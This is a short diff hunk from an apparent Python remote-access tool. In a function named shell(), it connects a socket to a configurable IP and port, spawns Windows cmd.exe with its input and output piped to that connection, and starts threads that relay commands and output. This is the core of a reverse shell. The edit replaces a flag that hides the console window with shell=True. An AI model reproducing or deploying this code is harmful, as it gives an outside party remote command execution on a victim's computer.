@@ -140,7 +140,7 @@ def shell():
 
 	try:
 		SOCKET.connect((IP,int(PORT)))
-		PROCESS      = subprocess.Popen(['\\windows\\system32\\cmd.exe'],stdout=subprocess.PIPE,stderr=subprocess.STDOUT,stdin=subprocess.PIPE,creationflags=0x08000000)
+		PROCESS      = subprocess.Popen(['\\windows\\system32\\cmd.exe'],stdout=subprocess.PIPE,stderr=subprocess.STDOUT,stdin=subprocess.PIPE,shell=True)
 		SHELLTHREADS = []
 
 		for THREADFUNC in [shellRecive, processSend]:
